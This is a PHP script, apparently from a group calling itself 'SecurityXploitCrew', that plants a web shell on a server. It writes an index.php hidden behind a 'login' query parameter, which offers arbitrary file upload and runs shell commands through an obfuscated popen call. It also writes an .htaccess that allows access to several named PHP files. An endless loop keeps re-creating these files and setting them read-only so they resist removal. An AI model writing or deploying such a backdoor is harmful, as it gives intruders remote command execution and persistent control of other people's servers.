<?php
// SecurityXploitCrew
// This script creates files and directories, then sets permissions to 0555 with 1 ms delays

$directory = "lsso";
$file = "index.php";
$file2 = ".htaccess";

// Content for the files
$indexContent = <<<EOD
<?php
// Check for the presence of the 'login' query parameter
if (!isset(\$_GET['login'])) {
    // Exit to make the page blank if 'login' is not present
    exit();
}
?>

<style type="text/css">
    body {
        color: #33ff33;
        background-color: black;
        font-weight: inherit;
    }
    h1,h2 {
        background-color: #4D4D4D;
        color: #000000;
        text-align: center;
    }
    h3,h4,h5 {
        color: silver;
        text-align: center;
    }
</style>
<b><br>
<h1>Uploading</h1>
<br><br>
<center>
<font color="blue">
<span style="font-family: monospace;">
<span style="color: rgb(255, 255, 255);">
<br><br>
<font color="black"></font>
<br></b>
<?php
// Obfuscate popen function name
\$po = "p"."o"."p"."e"."n";

// Obfuscate getcwd function name
\$gw = "g"."e"."t"."c"."w"."d";

// Get the target directory from user input, default to current directory
\$targetDir = isset(\$_POST['target_dir']) ? rtrim(\$_POST['target_dir'], '/') : htmlspecialchars(\$gw(), ENT_QUOTES, 'UTF-8');
\$uploadfile = \$targetDir . '/' . htmlspecialchars(\$_FILES['file']['name'], ENT_QUOTES, 'UTF-8');

if (\$_FILES['file']['error'] === UPLOAD_ERR_OK) {
    if (move_uploaded_file(\$_FILES['file']['tmp_name'], \$uploadfile)) {
        echo '<b>File uploaded successfully to: ' . htmlspecialchars(\$uploadfile, ENT_QUOTES, 'UTF-8') . '</b><br><br>';
    } else {
        echo '<b>Upload failed!</b><br><br>';
    }
} else {
    echo '<b>Upload error!</b><br><br>';
}

// Command execution section using obfuscated popen
if (\$_SERVER['REQUEST_METHOD'] === 'POST' && isset(\$_POST['cmd'])) {
    \$command = escapeshellcmd(\$_POST['cmd']); // Escaping the command for security
    \$handle = \$po(\$command, 'r');
    \$output = '';

    if (is_resource(\$handle)) {
        while (!feof(\$handle)) {
            \$output .= htmlspecialchars(fgets(\$handle, 4096), ENT_QUOTES, 'UTF-8');
        }
        pclose(\$handle);
        echo "<pre>\$output</pre>";
    } else {
        echo '<b>Command execution failed!</b><br><br>';
    }
}
?>
<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">
    <input type="text" name="target_dir" placeholder="Enter upload directory" size="50" value="<?php echo htmlspecialchars(\$gw(), ENT_QUOTES, 'UTF-8'); ?>">
    <br><br>
    <input type="file" name="file" size="50">
    <input name="_upl" type="submit" id="_upl" value="Upload">
</form>

<!-- Command execution form -->
<form action="" method="post">
    <input type="text" name="cmd" placeholder="Enter command to execute" size="50">
    <br><br>
    <input type="submit" value="Execute Command">
</form>
EOD;

$htaccessContent = <<<EOD
<Files mas.php|index.php|HEI-Policies.php|KISH-Clubs.php|>
Order Deny,Allow
Allow from all
</Files>
EOD;

// Function to create a directory and files
function createDirectoryAndFiles($directory, $file, $file2, $indexContent, $htaccessContent) {
    // Create directory if it doesn't exist
    if (!file_exists($directory)) {
        mkdir($directory, 0777, true);
    }

    // Create and write content to index.php
    $filePath = $directory . '/' . $file;
    if (!file_exists($filePath)) {
        file_put_contents($filePath, $indexContent);
    }

    // Create and write content to .htaccess
    $filePath2 = $directory . '/' . $file2;
    if (!file_exists($filePath2)) {
        file_put_contents($filePath2, $htaccessContent);
    }
}

// Function to set permissions with a 1 millisecond delay
function setPermissionsWithDelay($directory, $file, $file2, $delayMilliseconds) {
    // Apply permissions with delay for each chmod operation
    $directoryPath = realpath($directory);
    $filePath = realpath($file);
    $file2Path = realpath($file2);

    if ($directoryPath) {
        chmod($directoryPath, 0555);
        usleep($delayMilliseconds / 10000); // 1 millisecond delay
    }
    if ($filePath) {
        chmod($filePath, 0555);
        usleep($delayMilliseconds / 1000); // 1 millisecond delay
    }
    if ($file2Path) {
        chmod($file2Path, 0555);
        usleep($delayMilliseconds / 1000); // 1 millisecond delay
    }
}

// Continuous operation with 1 millisecond precision for chmod
$delayMilliseconds = 1; // 1 millisecond delay

while ($delayMilliseconds / 1000) {
    createDirectoryAndFiles($directory, $file, $file2, $indexContent, $htaccessContent);
    setPermissionsWithDelay($directory, $directory . '/' . $file, $directory . '/' . $file2, $delayMilliseconds);
    usleep($delayMilliseconds / 1000); // Sleep for 1 second before the next iteration
}
?>